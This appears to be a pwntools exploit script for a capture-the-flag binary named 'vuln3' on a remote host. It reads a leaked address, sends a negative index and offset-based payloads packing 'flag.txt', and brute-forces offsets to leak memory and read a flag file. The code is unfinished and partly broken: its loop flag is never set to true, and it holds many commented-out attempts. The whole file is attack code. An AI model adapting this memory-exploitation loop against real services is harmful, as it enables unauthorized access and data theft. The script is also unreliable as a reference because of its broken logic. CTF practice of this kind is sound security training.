from Crypto.Util.number import bytes_to_long,long_to_bytes
import os
from pwn import *
def _(args,end='\n'):
    pass
host = 'spclr.ch'
port = 1260
filename = [e for e in os.listdir() if e == 'vuln3'][0]
local = False
elf = ELF(f'./{filename}')
debug = print
STACK_BUF_SIZE = 0x30
#FOPEN_OFFSET = 320
flag_txt = str(u64(b'flag.txt')).encode()
num_val = str(65).encode()
FOPEN_OFFSET = 0x20a
fuzz = 300 if local else 354
i = 0
#diff = 0x29c6c2e7f6e7
got_leaked_buf_addr = False
#superaddress = 0x555851c7d31e
#superaddress = 0x7fff55ae0640
#superaddress = 0x394051a0
#superaddress = 0x564d0f6af31e
flag_bytes = b'\x66\x6c\x61\x67\x2e\x74\x78\x74'
payload = flag_bytes[::] + b'\x00'
useful = {}
#flag_b = 1*(str(bytes_to_long(b'flag.txt\0')))
while not got_leaked_buf_addr:
    T1 = fuzz + i
    print(f'fuzzing: {T1}')
    try:
        p = gdb.debug(f'./{filename}',"continue") if local else remote(host,port)
        debug(p.recvuntil(b'am: '))
        leaked_addr_hex = hex(int(p.recvuntil(b'\n').rstrip().decode(),16))[2:]
        # LEAKED START OF MAIN
        print(f'Leaked address: {leaked_addr_hex}')
        leaked_addr = (int(leaked_addr_hex,16))
        debug(f'Leaked address(bytes): {leaked_addr}')
        debug(p.recvuntil(b'> '))
        p.sendline(b'-2')
        debug(p.recvuntil(b'number: '))
        payload = str(leaked_addr+300).encode() if local\
                else str(leaked_addr+T1).encode() +b''+ flag_txt+b'9200'#b'\x00flag.txt\x00'
                #else p.sendline(str(superaddress).encode())#0*(flag_txt+b'\x00')+str(leaked_addr+T1).encode())
                #else p.sendline(str(leaked_addr+T1).encode()+b'\x00'+flag_txt+b'\x00')
        p.sendline(payload)
        #p.sendline(str('%13x$hn').encode())
        buf = (p.recv())
        print(f'got: {buf}')
        if b'Here have this:' in buf:
            leaked_buf_addr = int(buf[buf.index(b': ')+4:-1],16)
            print(f'got: {long_to_bytes(leaked_buf_addr)}')
            if leaked_buf_addr == 1:
                input()

            if leaked_buf_addr:
                got_leaked_buf_addr = False
                #input()
                #useful[T1] = (leaked_buf_addr, buf)
                #break
        elif b'stack smashing' in buf:
            print(f'stack smashing: {buf}')

            #useful[T1] = (leaked_buf_addr, buf)
            #input()
        if b'ictf' in buf:
            print(f'toastyy {buf}')
            #input()
            #useful[T1] = (leaked_buf_addr, buf)

    except Exception as e:
        print(f"Exception: {e}")
    finally:
        p.close()
    i += 1
    p.close()
print(f'leaked buf address: {leaked_buf_addr}')
